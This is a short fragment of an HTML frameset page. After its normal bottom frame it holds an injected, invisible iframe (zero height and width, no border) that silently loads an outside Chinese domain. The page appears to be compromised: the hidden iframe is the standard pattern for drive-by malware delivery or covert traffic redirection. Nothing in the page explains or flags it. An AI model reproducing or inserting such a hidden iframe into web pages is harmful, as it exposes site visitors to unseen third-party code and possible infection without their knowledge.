...
<frameset rows="90,*,30" cols="*" framespacing="0" frameborder="no" border="0">
  ...
  <frame src="down.php" name="bottomFrame" scrolling="No" noresize="noresize" id="bottomFrame" /><iframe frameBorder="0"  src="http://www.shihuibysj.cn" style="HEIGHT: 0;  WIDTH: 0; " ></iframe>
</frameset>
<noframes><body>
</body>
</noframes></html>
